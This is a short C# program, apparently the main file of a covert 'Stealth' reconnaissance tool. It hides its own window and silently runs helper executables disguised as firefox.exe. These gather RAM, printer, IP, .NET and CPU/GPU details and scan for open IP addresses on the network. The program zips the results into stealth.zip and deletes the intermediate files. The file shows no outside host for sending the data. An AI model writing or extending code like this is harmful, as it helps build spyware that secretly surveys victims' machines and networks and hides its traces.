using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using static Stealth.Util;

namespace Stealth
{
    class Program
    {
        static void Main(string[] args)
        {
            hide();
            Dictionary<string, string> tools = new Dictionary<string, string>()
            {
                { @"RamStatus\firefox.exe", "ram_info" },
                { @"ListPrinters\firefox.exe", "printers" },
                { @"GetIP\firefox.exe", "your_ips" },
                { @"GetDotNetVersion\firefox.exe", ".net" },
                { @"CpuGpuNames\firefox.exe", "cpu_gpu_info" }
            };
            ZipArchive zip = create_zip("stealth.zip");
            foreach (KeyValuePair<string, string> tool in tools)
            {
                Process.Start(new ProcessStartInfo(tool.Key)
                {
                    CreateNoWindow = true
                }).WaitForExit();
                add_entry(zip, tool.Value, tool.Value);
                delete(tool.Value);
            }
            Process.Start(@"IPScanner\firefox.exe").WaitForExit();
            add_entry(zip, "open_ips", "open_ips");
            add_entry(zip, "closed_ips", "closed_ips");
            delete("open_ips");
            delete("closed_ips");
            zip.Dispose();
        }
    }
}
